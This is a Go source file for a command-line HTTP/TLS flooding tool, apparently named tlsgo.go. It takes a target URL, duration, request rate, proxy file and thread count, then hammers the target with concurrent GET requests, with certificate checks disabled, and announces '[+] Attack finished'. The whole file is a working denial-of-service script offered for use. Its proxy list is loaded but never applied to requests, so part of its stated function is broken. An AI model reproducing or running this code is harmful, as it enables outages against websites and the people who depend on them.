package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var proxies []string

func http2(wg *sync.WaitGroup, target string, rps int, config *tls.Config) {
	defer wg.Done()

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: config,
			MaxIdleConns:    100,
			DisableKeepAlives: false,
		},
		Timeout: 30 * time.Second,
	}

	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		log.Printf("Failed to create request: %v", err)
		return
	}

	for i := 0; i < rps; i++ {
		func() {
			resp, err := client.Do(req)
			if err != nil {
				return
			}
			resp.Body.Close()
		}()
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	if len(os.Args) < 6 {
		fmt.Println("Usage: go run tlsgo.go <target> <duration> <rps> <proxyfile> <threads>")
		fmt.Println("Example: go run tlsgo.go https://example.com 60 10 proxy.txt 5")
		return
	}

	target := os.Args[1]
	duration, _ := strconv.Atoi(os.Args[2])
	rps, _ := strconv.Atoi(os.Args[3])
	proxylist := os.Args[4]
	threads, _ := strconv.Atoi(os.Args[5])

	file, err := os.Open(proxylist)
	if err != nil {
		log.Fatalf("Error reading file: %v", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			proxies = append(proxies, line)
		}
	}

	if len(proxies) == 0 {
		log.Fatal("No proxies found in the file")
	}

	fmt.Printf("[+] Target: %s\n[+] Duration: %ds\n[+] Threads: %d\n[+] Proxies: %d\n", target, duration, threads, len(proxies))

	config := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		NextProtos:         []string{"h2", "http/1.1"},
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
	}

	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go http2(&wg, target, rps, config)
		time.Sleep(time.Millisecond)
	}

	go func() {
		time.Sleep(time.Duration(duration) * time.Second)
		fmt.Println("[+] Attack finished")
		os.Exit(0)
	}()

	wg.Wait()
}
